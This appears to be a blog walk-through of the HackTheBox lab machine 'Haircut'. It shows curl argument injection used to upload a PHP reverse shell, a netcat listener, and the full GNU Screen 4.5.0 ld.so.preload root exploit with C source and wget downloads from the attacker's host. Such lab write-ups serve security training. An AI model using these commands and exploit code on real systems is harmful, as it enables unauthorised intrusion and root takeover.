---
title: "Walk-through of Haircut from HackTheBox"
header:
  teaser: /assets/images/2020-06-04-21-28-52.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - command_injection
  - curl
  - gobuster
---
## Machine Information

![haircut](/assets/images/2020-06-04-21-28-52.png)

Haircut is rated medium, although compared some other boxes it is relatively simple. It's main purpose is to demonstrate the problem with unsanitsed user inputs for CURL arguments. Skills required are basic knowledge of Linux, and enumerating ports and services. Skills learned are command injections and exploiting software vulnerabilities to escalate to root.

<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
| Link To Machine | [HTB - 021 - Medium - Haircut](https://www.hackthebox.eu/home/machines/profile/21) |
| Machine Release Date | 26th March 2017 |
| Date I Completed It | 4th June 2020 |
| Distribution used | Kali 2019.1 – [Release Info](https://www.kali.org/news/kali-linux-2019-1-release/) |

## Initial Recon

Check for open ports with Nmap:

```text
root@kali:~/htb/haircut# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.24 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:~/htb/haircut# nmap -p$ports -v -sC -sV -oA haircut 10.10.10.24

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-04 21:42 BST
Scanning 10.10.10.24 [4 ports]
Completed Ping Scan at 21:42, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:42
Completed Parallel DNS resolution of 1 host. at 21:42, 0.01s elapsed
Initiating SYN Stealth Scan at 21:42
Scanning 10.10.10.24 [2 ports]
Discovered open port 80/tcp on 10.10.10.24
Discovered open port 22/tcp on 10.10.10.24
Completed SYN Stealth Scan at 21:42, 0.05s elapsed (2 total ports)
Initiating Service scan at 21:42
Scanning 2 services on 10.10.10.24
Completed Service scan at 21:42, 6.07s elapsed (2 services on 1 host)
Nmap scan report for 10.10.10.24
Host is up (0.018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (128B)
```

Just two ports open, let have a look with gobuster:

```text
root@kali:~# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.24 -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.24
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/06/04 16:42:17 Starting gobuster
===============================================================
http://10.10.10.24/uploads (Status: 301)
http://10.10.10.24/exposed.php (Status: 200)
===============================================================
2020/06/04 16:49:24 Finished
===============================================================
```

## Gaining Access

We have found a hidden folder and a php page. Let's have a look at the site, and these as well:

![bighair](/assets/images/2020-06-04-21-46-52.png)

Just a static image on the home page, nothing in the source, try the uploads folder we found:

![forbidden](/assets/images/2020-06-04-21-46-32.png)

We can't browse to it, try the php file we found:

![exposed](/assets/images/2020-06-04-21-47-31.png)

Just a text box with with what looks to be a test file pre-entered, try clicking go:

![exposed_test](/assets/images/2020-06-04-21-47-58.png)

The output and the picture are clues that suggest the text box is taking what is entered as a parameter, and passing it to curl. We can test this by starting a web server on our Kali machine:

```text
root@kali:~/htb/haircut# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

Now try entering our local IP to see if we can connect to our web server:

![check_connection](/assets/images/2020-06-04-21-53-17.png)

We get a connection, so let's see if we can do command injection:

![try_ls](/assets/images/2020-06-04-21-54-52.png)

Nope, there is some level of checking against our input. Let's see if we can get curl to display its help:

![curl_help](/assets/images/2020-06-04-21-55-14.png)

Now we know we are passing a parameter to curl, which means we can try using -o to upload a file:

![write_file](/assets/images/2020-06-04-21-55-51.png)

Check back at our HTTP server and we see the file was requested by the box:

```text
root@kali:~/htb/haircut# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.10.10.24 - - [04/Jun/2020 16:46:30] "GET / HTTP/1.1" 200 -
10.10.10.24 - - [04/Jun/2020 17:03:09] "GET /hello.html HTTP/1.1" 200 -
```

See if we can get to that file on the box:

![test_file_exists](/assets/images/2020-06-04-21-56-13.png)

Success, so we have confirmed we can upload a file, time to put a shell on there:

```text
root@kali:~/htb/haircut# locate shell.php
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/php/shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/shell.php
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/findsocket/php-findsock-shell.php

root@kali:~/htb/haircut# cp /usr/share/webshells/php/php-reverse-shell.php .
```

Just had to edit that shell script to put my current IP in it, now upload through the web page as before:

![write_reverse_shell](/assets/images/2020-06-04-21-56-57.png)

Back on Kali get a nc session listening:

```text
root@kali:~/htb/haircut# nc -nlvp 1234
listening on [any] 1234 ...
```

Now back on box we browse to the uploaded shell:

![open_shell_php](/assets/images/2020-06-04-21-57-35.png)

## User Flag

Switch to Kali again and we have a connection:

```text
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.24] 51248
Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 21:38:58 up  4:01,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

First thing is upgrade to a proper shell:

```text
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@haircut:/$ ^Z
[1]+  Stopped                 nc -nlvp 1234
root@kali:~/htb/haircut# stty raw -echo
root@kali:~/htb/haircut# nc -nlvp 1234
```

Confirm who we are:

```text
www-data@haircut:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Let's see if we can get the user flag:

```text
www-data@haircut:/etc$ cat /home/maria/Desktop/user.txt
<<HIDDEN>>
```

## Privilege Escalation

We have the user flag, time to try and escalate to root. First thing I check for is SUID binaries:

```text
www-data@haircut:/$ find / -perm -4000 2>/dev/null
/bin/ntfs-3g
/bin/ping6
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/screen-4.5.
<SNIP>
```

We see an old version of screen, let's check it out:

```text
www-data@haircut:/$ /usr/bin/screen-4.5.0 -v
Screen version 4.05.00 (GNU) 10-Dec-16
```

Check searchsploit for exploits:

```text
root@kali:~/htb/haircut# searchsploit screen 4.5.0
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                    | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                              | linux/local/41152.txt
--------------------------------------------------------------------------------- ---------------------------------
```

As suspected we have found something, let's check it out:

```text
root@kali:~/htb/haircut# searchsploit -m linux/local/41154.sh
  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators
```

Looking at the script, we will need to manually create the files instead of letting the script do it:

```text
root@kali:~/htb/haircut# cat << EOF > /tmp/libhax.c
> #include <stdio.h>
> #include <sys/types.h>
> #include <unistd.h>
> __attribute__ ((__constructor__))
> void dropshell(void){
>    chown("/tmp/rootshell", 0, 0);
>    chmod("/tmp/rootshell", 04755);
>    unlink("/etc/ld.so.preload");
>    printf("[+] done!\n");
> }
> EOF
```

File libhax.c created containing the above, now need to compile it:

```text
root@kali:~/htb/haircut# gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:10:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
   10 |     chmod("/tmp/rootshell", 04755);
      |     ^~~~~
root@kali:~/htb/haircut# rm -f /tmp/libhax.c
```

Now do the second file:

```text
root@kali:~/htb/haircut# cat << EOF > /tmp/rootshell.c
> #include <stdio.h>
> int main(void){
>     setuid(0);
>     setgid(0);
>     seteuid(0);
>     setegid(0);
>     execvp("/bin/sh", NULL, NULL);
> }
> EOF
```

File created, now compile this one:

```text
root@kali:~/htb/haircut# gcc -o /tmp/rootshell /tmp/rootshell.c
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
    7 |     execvp("/bin/sh", NULL, NULL);
      |     ^~~~~~
/tmp/rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
root@kali:~/htb/haircut# rm -f /tmp/rootshell.c
```

We can ignore the errors. Now get the files over to the box:

```text
www-data@haircut:/etc$ cd /tmp

www-data@haircut:/tmp$ wget http://10.10.14.13:8000/libhax.so
--2020-06-04 22:16:06--  http://10.10.14.13:8000/libhax.so
Connecting to 10.10.14.13:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16136 (16K) [application/octet-stream]
Saving to: 'libhax.so'
libhax.so           100%[===================>]  15.76K  --.-KB/s    in 0.02s
2020-06-04 22:16:06 (888 KB/s) - 'libhax.so' saved [16136/16136]

www-data@haircut:/tmp$ wget http://10.10.14.13:8000/rootshell
--2020-06-04 22:16:23--  http://10.10.14.13:8000/rootshell
Connecting to 10.10.14.13:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16824 (16K) [application/octet-stream]
Saving to: 'rootshell.1'
rootshell.1         100%[===================>]  16.43K  --.-KB/s    in 0.03s
2020-06-04 22:16:23 (514 KB/s) - 'rootshell' saved [16824/16824]
```

Now we can try to escalate, first run screen:

```test
www-data@haircut:/tmp$ cd /etc
www-data@haircut:/etc$ umask 000
<en -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"

www-data@haircut:/etc$ screen -ls # screen itself is setuid, so...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.
```

## Root Flag

Ignore the error and run our exploit:

```text
www-data@haircut:/etc$ /tmp/rootshell
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

It worked, just need to get our flag:

```text
# cat /root/root.txt
<<HIDDEN>>
```

All done. See you next time.
